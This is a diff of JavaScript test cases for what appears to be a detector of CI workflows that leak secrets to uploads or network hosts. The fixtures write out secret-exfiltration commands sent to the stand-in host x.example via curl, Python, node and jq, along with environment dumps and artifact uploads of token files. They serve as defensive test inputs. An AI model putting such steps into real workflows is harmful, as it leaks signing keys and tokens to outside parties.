@@ -553,6 +553,152 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: what a later step can reach", () => {
     expect(hits()).toEqual([9, 10]);
   });
 
+  it("follows a written file by name, however a later step reads it", () => {
+    for (const reader of [
+      `python3 -c "import requests; requests.post('https://x.example', data=open('secret.txt').read())"`,
+      'curl -d "$(base64 secret.txt)" https://x.example/i',
+      "jq -c . secret.txt | curl -d @- https://x.example/i",
+      `node -e "const https = require('https'); https.request('https://x.example').end(require('fs').readFileSync('secret.txt'))"`,
+    ]) {
+      workflow([
+        ...HEAD,
+        "    steps:",
+        '      - env: { T: "${{ secrets.SIGNING_KEY }}" }',
+        '        run: echo "$T" > secret.txt',
+        `      - run: ${reader}`,
+      ]);
+      expect(hits(), reader).toEqual([9]);
+    }
+  });
+
+  it("passes a written file on through a step that reads it and writes another", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      '      - env: { T: "${{ secrets.SIGNING_KEY }}" }',
+      '        run: echo "$T" > dist/key.txt',
+      "      - run: tar czf bundle.tgz dist",
+      "      - run: curl -T bundle.tgz https://x.example/upload",
+    ]);
+    expect(hits()).toEqual([10]);
+  });
+
+  it("does not treat a comparison as reading the written file", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      '      - env: { T: "${{ secrets.SIGNING_KEY }}" }',
+      '        run: echo "$T" > key.txt',
+      "      - run: |",
+      '          python3 -c "assert 1 < 2"',
+      "          curl -fsS https://x.example/health",
+    ]);
+    expect(hits()).toEqual([]);
+  });
+
+  it("falls back to any file read when the written file has no stated name", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      '      - env: { T: "${{ secrets.SIGNING_KEY }}" }',
+      '        run: echo "$T" > "$OUT_FILE"',
+      "      - run: curl -fsS https://x.example/health",
+      '      - run: python3 -c "assert 1 < 2" && curl -fsS https://x.example/health',
+      '      - run: curl -d @"$OUT_FILE" https://x.example/i',
+      '      - run: source "$OUT_FILE" && curl -d "$T2" https://x.example/i',
+    ]);
+    expect(hits()).toEqual([11, 12]);
+  });
+
+  it("follows a file Python opens for writing, and not a stderr redirect", () => {
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      T: ${{ secrets.SIGNING_KEY }}",
+      "    steps:",
+      `      - run: python3 -c "import os; open('k.txt', 'w').write(os.environ['T'])"`,
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: k.txt",
+    ]);
+    expect(hits()).toEqual([10]);
+
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      T: ${{ secrets.SIGNING_KEY }}",
+      "    steps:",
+      '      - run: test -n "$T" 2> err.log',
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: err.log",
+    ]);
+    expect(hits()).toEqual([]);
+  });
+
+  it("counts a whole-environment dump as holding every secret in scope", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      "      - run: printenv >> $GITHUB_ENV",
+      "        env:",
+      "          T: ${{ secrets.NPM_TOKEN }}",
+      '      - run: curl -d "$T" https://x.example/i',
+    ]);
+    expect(hits()).toEqual([10]);
+
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      U: ${{ secrets.NPM_TOKEN }}",
+      "    steps:",
+      '      - run: node -e "require(\'fs\').writeFileSync(\'env.json\', JSON.stringify(process.env))"',
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: env.json",
+    ]);
+    expect(hits()).toEqual([10]);
+
+    // `set -e` sets shell options; it does not print the environment.
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      V: ${{ secrets.NPM_TOKEN }}",
+      "    steps:",
+      "      - run: set -euo pipefail && echo ok > ok.txt",
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: ok.txt",
+    ]);
+    expect(hits()).toEqual([]);
+  });
+
+  it("does not send a job-level secret through an upload unless a file carries it", () => {
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      TURBO_TOKEN: ${{ secrets.TURBO_TOKEN }}",
+      "    steps:",
+      "      - run: npx turbo build > build.log",
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: build.log",
+    ]);
+    expect(hits()).toEqual([]);
+
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      TURBO_TOKEN: ${{ secrets.TURBO_TOKEN }}",
+      "    steps:",
+      '      - run: echo "$TURBO_TOKEN" > token.txt',
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: token.txt",
+    ]);
+    expect(hits()).toEqual([10]);
+  });
+
   it("does not read a Windows drive path or a script named after a tool as egress", () => {
     workflow([
       ...HEAD,
@@ -600,7 +746,7 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
 
     const cats = "cat cat ".repeat(Math.ceil(FIVE_MIB / 8));
     expect(
-      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", "        run: echo x > f", `      - run: curl https://x.example ${cats}`]),
+      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", '        run: echo "$T" > "$F"', `      - run: curl https://x.example ${cats}`]),
     ).toBeLessThan(performanceBudget(15_000));
 
     const quotes = '"'.repeat(FIVE_MIB);
